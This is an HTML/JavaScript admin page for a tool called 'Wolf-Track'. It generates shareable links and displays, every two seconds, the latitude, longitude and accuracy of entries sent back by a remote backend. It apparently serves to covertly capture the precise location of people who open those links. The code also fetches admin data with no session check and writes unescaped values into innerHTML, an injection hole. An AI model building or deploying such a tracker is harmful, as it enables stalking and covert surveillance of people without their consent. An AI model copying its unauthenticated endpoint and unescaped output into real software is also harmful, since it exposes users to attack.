<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Wolf-Track Admin</title>
<style>
body{font-family:system-ui;background:#f4f6f8;margin:0}
.box{max-width:400px;margin:60px auto;background:#fff;padding:20px;border-radius:12px}
button{background:#2563eb;color:#fff;border:none;padding:10px 16px;border-radius:8px}
input{width:100%;padding:10px;margin:10px 0}
.loader{display:none;text-align:center}
.user{border:1px solid #ddd;padding:10px;margin-top:10px;border-radius:8px}
</style>
</head>

<body>

<div class="box" id="loginBox">
  <h3>Admin Login</h3>
  <input id="pass" type="password" placeholder="Password">
  <button onclick="login()">Login</button>
</div>

<div class="box" id="panel" style="display:none">
  <button onclick="generate()">Generate Link</button>
  <input id="link" readonly>
  <div class="loader" id="loader">Loading…</div>
  <div id="users"></div>
</div>

<script>
const API="https://wolf-track-backend.up.railway.app";
let sessionId=null;

function login(){
  fetch(API+"/login",{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({password:pass.value})
  })
  .then(r=>r.json())
  .then(d=>{
    sessionId=d.sessionId;
    loginBox.style.display="none";
    panel.style.display="block";
    load();
  })
  .catch(()=>alert("Wrong password"));
}

function generate(){
  loader.style.display="block";
  fetch(API+"/create-link",{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({sessionId})
  })
  .then(r=>r.json())
  .then(d=>{
    link.value=d.link;
    loader.style.display="none";
  });
}

async function load(){
  const r=await fetch(API+"/admin-data");
  const data=await r.json();
  users.innerHTML="";
  for(const t in data){
    const u=data[t];
    users.innerHTML+=`
      <div class="user">
        <b>${t}</b><br>
        ${u.lat}, ${u.lng}<br>
        Accuracy: ${u.acc}m
      </div>`;
  }
}

setInterval(load,2000);
</script>

</body>
</html>
